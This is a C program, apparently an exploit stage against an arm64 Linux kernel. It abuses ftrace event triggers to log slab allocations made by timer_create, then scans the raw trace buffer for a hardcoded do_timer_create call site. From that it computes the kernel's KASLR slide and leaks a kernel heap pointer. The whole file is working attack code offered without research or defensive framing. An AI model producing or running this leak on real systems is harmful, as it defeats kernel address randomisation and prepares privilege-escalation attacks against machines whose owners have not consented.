#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define LINK_SITE 0xffffffc0803718f4ULL /* do_timer_create+0x94 */

static void *worker(void *a)
{
	(void)a;
	for (;;)
		pause();
	return 0;
}

static int wr(const char *p, const char *v)
{
	int fd = open(p, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	int r = write(fd, v, strlen(v));
	close(fd);
	return r < 0 ? -1 : 0;
}

int main(void)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);
	wr(TRACE "/tracing_on", "0\n");
	wr(TRACE "/per_cpu/cpu0/trace", ""); /* clear */
	wr(TRACE "/tracing_on", "1\n");
	/* enable kmem_cache_alloc through the rss_stat trigger */
	wr(TRACE "/events/kmem/rss_stat/trigger", "!enable_event:kmem:kmem_cache_alloc\n");
	if (wr(TRACE "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc\n"))
		printf("trigger write failed errno=%d\n", errno);
	/* soft-enable the target event by firing rss_stat once */
	if (wr(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		printf("rss enable failed errno=%d\n", errno);
	{
		volatile unsigned char *m = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
										 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (m != MAP_FAILED)
		{
			for (int i = 0; i < 65536; i += 4096)
				m[i] = 1;
			munmap((void *)m, 65536);
		}
	}
	pthread_t t;
	pthread_create(&t, NULL, worker, NULL);
	clockid_t cid;
	pthread_getcpuclockid(t, &cid);
	struct sigevent ev;
	memset(&ev, 0, sizeof ev);
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo = SIGRTMIN;
	timer_t id;
	int r = timer_create(cid, &ev, &id);
	struct itimerspec its;
	memset(&its, 0, sizeof its);
	its.it_value.tv_sec = 3600;
	timer_settime(id, 0, &its, NULL);
	printf("timer_create=%d\n", r);
	wr(TRACE "/events/kmem/rss_stat/enable", "0\n");
	wr(TRACE "/tracing_on", "0\n");
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC | O_NONBLOCK);
	if (fd < 0)
	{
		printf("raw open errno=%d\n", errno);
		return 1;
	}
	static uint8_t buf[1 << 21];
	size_t used = 0;
	for (int i = 0; i < 200 && used < sizeof(buf); i++)
	{
		ssize_t n = read(fd, buf + used, sizeof(buf) - used);
		if (n <= 0)
		{
			if (errno == EAGAIN)
			{
				usleep(20000);
				continue;
			}
			break;
		}
		used += n;
	}
	close(fd);
	printf("raw bytes=%zu\n", used);
	int found = 0;
	for (size_t i = 0; i + 32 <= used; i++)
	{
		uint64_t v, p, req;
		memcpy(&v, buf + i, 8);
		if ((v >> 32) != 0xffffffc0ULL)
			continue;
		if ((v & 0x1fffffULL) != (LINK_SITE & 0x1fffffULL))
			continue;
		uint64_t slide = v - LINK_SITE;
		if (slide > 0x40000000ULL || (slide & 0x1fffffULL))
			continue;
		memcpy(&p, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (found < 5)
			printf("cand site=0x%llx slide=0x%llx ptr=0x%llx req=0x%llx off=0x%zx\n",
				   (unsigned long long)v, (unsigned long long)slide,
				   (unsigned long long)p, (unsigned long long)req, i);
		if ((p >> 48) != 0xffffULL || (p & 7))
			continue;
		if (req != 0x100)
			continue;
		printf("HIT site=0x%llx slide=0x%llx ptr=0x%llx req=0x%llx off=0x%zx\n",
			   (unsigned long long)v, (unsigned long long)slide,
			   (unsigned long long)p, (unsigned long long)req, i);
		found++;
	}
	printf("found=%d\n", found);
	return found ? 0 : 2;
}
